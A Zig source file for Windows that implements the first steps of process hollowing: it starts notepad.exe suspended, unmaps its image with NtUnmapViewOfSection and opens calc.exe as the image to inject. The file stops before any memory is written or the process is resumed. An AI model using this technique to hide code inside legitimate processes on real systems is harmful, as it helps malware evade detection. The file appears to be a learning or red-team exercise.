const std = @import("std");
const win = std.os.windows;
const win32 = @import("win32");
const unicode = std.unicode;
const ntdll = @import("ntdll");

// Windows types
const PVOID = win.PVOID;
const ULONG = win.ULONG;
const LIST_ENTRY = win.LIST_ENTRY;
const UNICODE_STRING = win.UNICODE_STRING;
const HANDLE = win.HANDLE;
const BOOLEAN = win.BOOLEAN;
const UCHAR = win.UCHAR;
const HMODULE = win.HMODULE;
const DWORD = win.DWORD;
const HINSTANCE = win.HINSTANCE;
const STARTUPINFOW = win.STARTUPINFOW;
const PROCESS_INFORMATION = win.PROCESS_INFORMATION;
const BOOL = win.BOOL;
const LPWSTR = win.LPWSTR;
const LPCWSTR = win.LPCWSTR;
const SECURITY_ATTRIBUTES = win.SECURITY_ATTRIBUTES;
const LPVOID = win.LPVOID;
const LPCVOID = win.LPCVOID;
const SECURITY_DESCRIPTOR = win.SECURITY_DESCRIPTOR;
const SECURITY_DESCRIPTOR_RELATIVE = win.SECURITY_DESCRIPTOR_RELATIVE;
const SECURITY_DESCRIPTOR_CONTROL = win.SECURITY_DESCRIPTOR_CONTROL;
const SECURITY_INFORMATION = win.SECURITY_INFORMATION;
const PROCESS_QUERY_INFORMATION = win.PROCESS_QUERY_INFORMATION;
const PROCESS_VM_OPERATION = win.PROCESS_VM_OPERATION;
const WINAPI = win.WINAPI;
const SIZE_T = win.SIZE_T;
const ULONG_PTR = win.ULONG_PTR;
const FALSE = win.FALSE;
const TRUE = win.TRUE;
const NTSTATUS = win.NTSTATUS;
const INFINITE = win.INFINITE;
const CREATE_SUSPENDED: DWORD = 0x00000004;
const ACCESS_MASK = win.ACCESS_MASK;
const OBJECT_ATTRIBUTES = win.OBJECT_ATTRIBUTES;
const IO_STATUS_BLOCK = win.IO_STATUS_BLOCK;
const LARGE_INTEGER = win.LARGE_INTEGER;

// disposition for NtCreateFile
pub const FILE_SUPERSEDE = 0;
pub const FILE_OPEN = 1;
pub const FILE_CREATE = 2;
pub const FILE_OPEN_IF = 3;
pub const FILE_OVERWRITE = 4;
pub const FILE_OVERWRITE_IF = 5;
pub const FILE_MAXIMUM_DISPOSITION = 5;

// flags for NtCreateFile and NtOpenFile
pub const FILE_READ_DATA = 0x00000001;
pub const FILE_LIST_DIRECTORY = 0x00000001;
pub const FILE_WRITE_DATA = 0x00000002;
pub const FILE_ADD_FILE = 0x00000002;
pub const FILE_APPEND_DATA = 0x00000004;
pub const FILE_ADD_SUBDIRECTORY = 0x00000004;
pub const FILE_CREATE_PIPE_INSTANCE = 0x00000004;
pub const FILE_READ_EA = 0x00000008;
pub const FILE_WRITE_EA = 0x00000010;
pub const FILE_EXECUTE = 0x00000020;
pub const FILE_TRAVERSE = 0x00000020;
pub const FILE_DELETE_CHILD = 0x00000040;
pub const FILE_READ_ATTRIBUTES = 0x00000080;
pub const FILE_WRITE_ATTRIBUTES = 0x00000100;

pub const PEB = extern struct { InheritedAddressSpace: BOOLEAN, ReadImageFileExecOptions: BOOLEAN, BeingDebugged: BOOLEAN, BitField: UCHAR, Mutant: HANDLE, ImageBaseAddress: HMODULE };

extern "kernel32" fn CreateProcessW(
    lpApplicationName: ?LPCWSTR,
    lpCommandLine: ?LPWSTR,
    lpProcessAttributes: ?*SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    bInheritHandles: BOOL,
    dwCreationFlags: DWORD,
    lpEnvironment: ?LPVOID,
    lpCurrentDirectory: ?LPCWSTR,
    lpStartupInfo: *STARTUPINFOW,
    lpProcessInformation: *PROCESS_INFORMATION,
) callconv(WINAPI) BOOL;

extern "kernel32" fn WriteProcessMemory(
    hProcess: HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: [*]const u8,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(WINAPI) BOOL;

pub const PROCESS_BASIC_INFORMATION = extern struct {
    ExitStatus: ULONG,
    PebBaseAddress: *PEB,
    AffinityMask: ULONG_PTR,
    BasePriority: ULONG,
    UniqueProcessId: ULONG_PTR,
    InheritedFromUniqueProcessId: ULONG_PTR,
};

pub const ProcessBaseAddressError = error{
    AccessDenied,
    InvalidHandle,
    Unexpected,
};

pub extern "ntdll" fn NtUnmapViewOfSection(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID,
) callconv(.winapi) NTSTATUS;

pub extern "ntdll" fn NtCreateFile(
    FileHandle: *HANDLE,
    DesiredAccess: ACCESS_MASK,
    ObjectAttributes: *OBJECT_ATTRIBUTES,
    IoStatusBlock: *IO_STATUS_BLOCK,
    AllocationSize: ?*LARGE_INTEGER,
    FileAttributes: ULONG,
    ShareAccess: ULONG,
    CreateDisposition: ULONG,
    CreateOptions: ULONG,
    EaBuffer: ?*anyopaque,
    EaLength: ULONG,
) callconv(.winapi) NTSTATUS;

pub fn CreateSuspendedProcess(dwCreationFlags: DWORD, lpProcessName: ?LPWSTR, dwProcessId: *u32, hProcess: *HANDLE, hThread: *HANDLE) bool {

    // Initialize structs
    var startup_info: STARTUPINFOW = std.mem.zeroes(STARTUPINFOW);
    var process_info: PROCESS_INFORMATION = std.mem.zeroes(PROCESS_INFORMATION);

    const result: BOOL = CreateProcessW(
        null,
        lpProcessName,
        null,
        null,
        win.FALSE,
        dwCreationFlags, // Use the manually defined constant
        null,
        null,
        &startup_info,
        &process_info,
    );
    if (result == FALSE) {
        std.debug.print("[+] CreateProcessW() failed.\n", .{});
    }

    std.debug.print("[+] DONE\n", .{});

    // Populate the output parameters
    dwProcessId.* = process_info.dwProcessId;
    hProcess.* = process_info.hProcess;
    hThread.* = process_info.hThread;

    return true;
}

const process_name = "notepad.exe";
const image_path = "\\\\.\\C:\\Windows\\System32\\calc.exe"; // The image we want to inject

pub fn main() !void {

    // Create a general purpose allocator
    var gpa = std.heap.DebugAllocator(.{}){};
    const alloc = gpa.allocator();

    // Create UTF-16 command line for `notepad.exe`
    // const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, "notepad.exe");
    const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, process_name);
    const wide_image_path = try unicode.utf8ToUtf16LeAllocZ(alloc, image_path);

    // defer alloc.free(wide_cmd_line);

    // Initialize variables
    var hProcess: HANDLE = undefined;
    var hThread: HANDLE = undefined;
    var dwProcessId: u32 = undefined;

    // create suspended process
    std.debug.print("[+] Creating suspended process for '{s}'\n", .{process_name});
    if (!CreateSuspendedProcess(CREATE_SUSPENDED, wide_cmd_line, &dwProcessId, &hProcess, &hThread)) {
        std.debug.print("[+] CreateSuspendedProcess() failed.\n", .{});
    }
    std.debug.print("[+] Process created with ID: {d}\n", .{dwProcessId});
    std.debug.print("[+] Process handle: {*}\n", .{hProcess});

    // Read the base address of the remote process
    std.debug.print("[+] Retrieving process base address...\n", .{});
    const base_address = try win.ProcessBaseAddress(hProcess);
    const base_addr_value = @intFromPtr(base_address);
    std.debug.print("[+] Process base address retrieved: 0x{X}\n", .{base_addr_value});

    // declare our read buffer
    const stdout = std.io.getStdOut().writer();
    const stdin = std.io.getStdIn().reader();
    var read_buffer: [256]u8 = undefined;
    _ = stdout;

    // Unmap the entire image of the remote process
    std.debug.print("[+] Enter to Unmap the remote process...\n", .{});
    _ = try stdin.readUntilDelimiterOrEof(read_buffer[0..], '\n');

    const nt_status = NtUnmapViewOfSection(hProcess, base_address);
    if (nt_status != .SUCCESS) {
        std.debug.print("[+] NtUnmapViewOfSection() failed with status: {d}\n", .{nt_status});
        return error.Unexpected;
    }
    std.debug.print("[+] Remote process unmapped successfully.\n", .{});
    _ = try stdin.readUntilDelimiterOrEof(read_buffer[0..], '\n');

    // Now lets get the source image that we want to inject
    // Create UNICODE_STRING for the file path
    var unicode_string = UNICODE_STRING{
        .Length = @intCast(wide_image_path.len * 2 - 2), // -2 to exclude null terminator
        .MaximumLength = @intCast(wide_image_path.len * 2),
        .Buffer = @ptrCast(wide_image_path.ptr),
    };

    // Initialize OBJECT_ATTRIBUTES
    var object_attributes = win.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(win.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &unicode_string,
        .Attributes = 0,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    // Initialize IO_STATUS_BLOCK
    var io_status_block = IO_STATUS_BLOCK{
        .u = .{ .Status = .SUCCESS },
        .Information = 0,
    };

    var hSourceFile: HANDLE = undefined;
    const nt_status_file = NtCreateFile(
        &hSourceFile,
        FILE_READ_DATA | FILE_READ_ATTRIBUTES,
        &object_attributes,
        &io_status_block,
        null,
        0, // FILE_ATTRIBUTE_NORMAL
        0, // No sharing
        FILE_OPEN, // Open existing file
        0, // No special options
        null,
        0,
    );

    if (nt_status_file != .SUCCESS) {
        std.debug.print("[+] NtCreateFile() failed with status: {}\n", .{nt_status_file});
        return error.Unexpected;
    }
    std.debug.print("[+] Successfully opened handle to source image: {*}\n", .{hSourceFile});
}
